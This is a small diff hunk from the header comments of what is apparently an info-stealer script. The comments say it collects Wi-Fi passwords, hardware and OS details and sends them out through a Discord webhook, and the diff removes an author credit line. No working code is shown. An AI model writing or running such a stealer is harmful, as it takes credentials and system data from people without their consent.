@@ -1,6 +1,5 @@
 #This script gets out all infomations out of the system, and send it to somewhere, via discord webhook. Including Wifi passwords, the pc-s hardware info, os details.
 
-# Created by THrown_Creeper#4036 (thrown-creeper.webnode.hu, throwncreeper@gmail.com)
 # Ez egy közönséges adatszerző script...
 
 # Stopper indítása:
